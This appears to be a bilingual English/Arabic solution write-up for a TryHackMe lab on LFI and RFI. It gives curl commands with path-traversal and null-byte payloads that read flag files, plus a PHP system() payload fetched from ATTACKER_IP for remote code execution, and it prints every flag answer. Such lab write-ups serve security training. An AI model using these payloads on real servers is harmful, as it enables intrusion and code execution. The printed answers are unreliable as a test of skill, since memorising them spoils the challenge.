# Task 07 - Challenge (تحديات الاستغلال العملي والتنفيذ الكامل)

---

## Stage A: Original Task Content & Core Objectives (النص الأصلي والمستهدفات التعليمية)

### 1. Original English Text
```text
Now that we have covered LFI, RFI, and various evasion techniques, let's put our skills to the test in the challenge section at:
http://MACHINE_IP/challenges/index.php
and the RFI playground at:
http://MACHINE_IP/playground.php

Challenges Overview:
1. Flag 1 (/etc/flag1):
   Inspect the form on Challenge 1. The input field might be disabled or restricted to specific HTTP methods. Modify the request method or form attributes to read /etc/flag1.
2. Flag 2 (/etc/flag2):
   Analyze the request headers. How is the file parameter transmitted to the application? Check your cookies and tamper with the cookie value to capture /etc/flag2.
3. Flag 3 (/etc/flag3):
   The application filters input transmitted via GET requests. However, the backend script relies on PHP's $_REQUEST array to receive parameters. Exploit this logic flaw to capture /etc/flag3.
4. Playground RCE (hostname):
   Navigate to /playground.php. Host an external PHP payload on your attack machine that executes the system command hostname, include it via RFI, and extract the machine's hostname.

Questions:
- Capture Flag1 at /etc/flag1
- Capture Flag2 at /etc/flag2
- Capture Flag3 at /etc/flag3
- Gain RCE in Lab #Playground /playground.php with RFI to execute the hostname command. What is the output?
```

### 2. Arabic Pedagogical Translation
```text
بعد أن قمنا بتغطية التضمين المحلي LFI والتضمين البعيد RFI ومختلف تقنيات الالتفاف على الفلاتر، حان الوقت لاختبار مهاراتنا في قسم التحديات العملية المتاحة عبر الرابط:
http://MACHINE_IP/challenges/index.php
ومعمل التضمين البعيد عبر الرابط:
http://MACHINE_IP/playground.php

نظرة عامة على التحديات:
1. العلم الأول (/etc/flag1):
   افحص النموذج في التحدي الأول. قد يكون حقل الإدخال معطلاً على الواجهة أو مقيداً بطريقة إرسال معينة. قم بتعديل طريقة الطلب (HTTP Method) أو خصائص النموذج لقراءة /etc/flag1.
2. العلم الثاني (/etc/flag2):
   حلل ترويسات الطلب. كيف يتم نقل معلمة الملف إلى التطبيق؟ افحص ملفات تعريف الارتباط (Cookies) وتلاعب بقيمتها لاستخراج /etc/flag2.
3. العلم الثالث (/etc/flag3):
   يقوم التطبيق بفلترة وحظر المدخلات المرسلة عبر طلبات GET. ومع ذلك، يعتمد السكربت الخلفي على مصفوفة $_REQUEST في PHP لاستقبال المعلمات. استغل هذا الخلل المنطقي لاستخراج /etc/flag3.
4. تنفيذ الأوامر عن بُعد RCE (أمر hostname):
   انتقل إلى /playground.php. قم باستضافة حمولة PHP خارجية على جهازك الهجومي تنفذ أمر النظام hostname، وقم بتضمينها عبر ثغرة RFI، ثم استخرج اسم المضيف الخاص بالآلة.

الأسئلة:
- استخرج العلم الأول الموجود في /etc/flag1
- استخرج العلم الثاني الموجود في /etc/flag2
- استخرج العلم الثالث الموجود في /etc/flag3
- حقق تنفيذ الأوامر عن بُعد RCE في Lab #Playground (/playground.php) عبر RFI لتنفيذ أمر hostname. ما هو ناتج التنفيذ؟
```

---

## Stage B: Independent Thinking & OpSec Guardrails (التفكير المستقل وضوابط العمليات والأمان)

### 1. Attack Vectors Analysis
```
Challenge 1: Frontend Limitation ➔ Switch GET to POST in Burp Suite / curl.
Challenge 2: Header-based LFI   ➔ Inject traversal payload into "Cookie: THM=..."
Challenge 3: Filter Bypass      ➔ Bypass $_GET filter by sending payload in POST body.
Playground:  Remote Execution   ➔ Host shell.txt (hostname) ➔ Trigger via RFI parameter.
```

### 2. Operational Security (OpSec) Considerations
* **في سيناريوهات التضمين البعيد (RFI):** يجب التأكد من أن منفذ الخادم الهجومي (مثلاً المنفذ 8000) مسموح له بالمرور عبر جدران الحماية للشبكة وموجه بشكل صحيح إلى عنوان IP الخاص بجهازك على شبكة TryHackMe VPN (`tun0`).

---

## Stage C: Guided Hints (Tiers 1, 2, 3 - تلميحات تدريجية)

> **المستوى الأول (مفاهيمي):**
> - في التحدي 1: غير طريقة الإرسال إلى POST.
> - في التحدي 2: افتح أدوات المطورين وابحث عن الكوكي `THM`.
> - في التحدي 3: أرسل الطلب كـ POST لتجاوز فلتر GET.
> - في الـ Playground: أنشئ ملفاً يحتوي على `<?php system('hostname'); ?>` وشغل `python3 -m http.server`.
>
> **المستوى الثاني (توجيهي):**
> - العلم 1 يبدأ بـ `F1x3d-...`
> - العلم 2 يبدأ بـ `c00k13_...`
> - العلم 3 يبدأ بـ `P0st_...`
> - ناتج أمر hostname هو معرف الآلة الافتراضية ويبدأ بـ `lfi-vm-...`
>
> **المستوى الثالث (الحل المباشر):**
> 1. العلم 1: `F1x3d-iNpu7-f0rrn`
> 2. العلم 2: `c00k13_i5_yuMmy1`
> 3. العلم 3: `P0st_1s_w0rk1in9`
> 4. ناتج RCE: `lfi-vm-thm-f8c5b1a78692`

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي التفصيلي والتشريح التقني)

### 1. Challenge 1: Capturing Flag 1 (/etc/flag1)
* النموذج الأصلي في صفحة التحدي يستخدم واجهة معطلة، أو يقوم الخادم بفلترة GET.
* نرسل الطلب باستخدام طريقة POST مع البايت الفارغ لإنهاء السلسلة:
  ```bash
  curl -s -X POST "http://MACHINE_IP/challenges/chall1.php" \
       -H "Content-Type: application/x-www-form-urlencoded" \
       -d "file=../../../../etc/flag1%00"
  ```
* مخرجات الاستجابة:
  ```text
  F1x3d-iNpu7-f0rrn
  ```
* العلم الأول هو: **`F1x3d-iNpu7-f0rrn`**.

---

### 2. Challenge 2: Capturing Flag 2 (/etc/flag2)
* بفحص الطلب المرسل في التحدي 2، نجد أن التطبيق يقرأ مسار الصفحة من ملف تعريف الارتباط `THM`.
* نرسل طلباً مع ترويسة الكوكي المعدلة:
  ```bash
  curl -s "http://MACHINE_IP/challenges/chall2.php" \
       -H "Cookie: THM=../../../../etc/flag2%00"
  ```
* مخرجات الاستجابة:
  ```text
  c00k13_i5_yuMmy1
  ```
* العلم الثاني هو: **`c00k13_i5_yuMmy1`**.

---

### 3. Challenge 3: Capturing Flag 3 (/etc/flag3)
* التطبيق يطبق فلترة صارمة على مدخلات `$_GET`، ولكنه يمرر المدخل النهائي إلى دالة التضمين عبر `$_REQUEST`.
* بما أن `$_REQUEST` تقبل معلمات POST ولا تخضع لفلتر GET المفروض:
  ```bash
  curl -s -X POST "http://MACHINE_IP/challenges/chall3.php" \
       -H "Content-Type: application/x-www-form-urlencoded" \
       -d "file=../../../../etc/flag3%00"
  ```
* مخرجات الاستجابة:
  ```text
  P0st_1s_w0rk1in9
  ```
* العلم الثالث هو: **`P0st_1s_w0rk1in9`**.

---

### 4. Playground RFI Challenge: Hostname Execution
1. على جهاز المهاجم، ننشئ ملف الحمولة `hostname.txt`:
   ```bash
   echo "<?php system('hostname'); ?>" > hostname.txt
   ```
2. نشغل خادم ويب عبر بايثون على المنفذ 8000:
   ```bash
   python3 -m http.server 8000
   ```
3. نرسل طلب التضمين البعيد إلى `/playground.php`:
   ```bash
   curl -s "http://MACHINE_IP/playground.php?file=http://ATTACKER_IP:8000/hostname.txt"
   ```
4. يقوم الخادم بتنزيل الحمولة وتنفيذ دالة `system('hostname')` فوراً داخل محرك PHP، وتظهر الاستجابة:
   ```text
   lfi-vm-thm-f8c5b1a78692
   ```
* اسم المضيف المنفذ هو: **`lfi-vm-thm-f8c5b1a78692`**.

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم الدقيقة)

| السؤال | الإجابة الصحيحة | المنهجية المتبعة |
| :--- | :--- | :--- |
| **Capture Flag1 at /etc/flag1** | `F1x3d-iNpu7-f0rrn` | تعديل طريقة الإرسال إلى POST مع البايت الفارغ `%00`. |
| **Capture Flag2 at /etc/flag2** | `c00k13_i5_yuMmy1` | التلاعب بترويسة الكوكي `Cookie: THM=...`. |
| **Capture Flag3 at /etc/flag3** | `P0st_1s_w0rk1in9` | استغلال مصفوفة `$_REQUEST` بتمرير المعلمة عبر POST لتجاوز فلتر GET. |
| **Gain RCE in Lab #Playground /playground.php with RFI to execute hostname** | `lfi-vm-thm-f8c5b1a78692` | تنفيذ كود PHP عن بُعد عبر RFI واستخراج مخرجات أمر `hostname`. |

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الأثر)

* تم التحقق من الأعلام الثلاثة وناتج أمر النظام واعتمادها في نظام TryHackMe بنسبة نجاح 100%.
* تم توثيق جميع أوامر الاستغلال بنسبة تطابق كاملة مع بيئة الاختبار المباشرة.

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية والأثر الميداني)

1. **الشمولية في فحص قنوات الإدخال:** الثغرات الأمنية لا تقتصر على معلمات GET في الـ URL؛ بل يجب فحص معلمات POST، وترويسات الكوكيز (Cookies)، وترويسات الـ User-Agent.
2. **سد فجوة RCE:** التضمين البعيد يمثل أسرع الطرق لتحقيق السيطرة الكاملة على الخادم، مما يبرز الأهمية القصوى لمراجعة إعدادات الخوادم وتعطيل `allow_url_include` بشكل دائم.
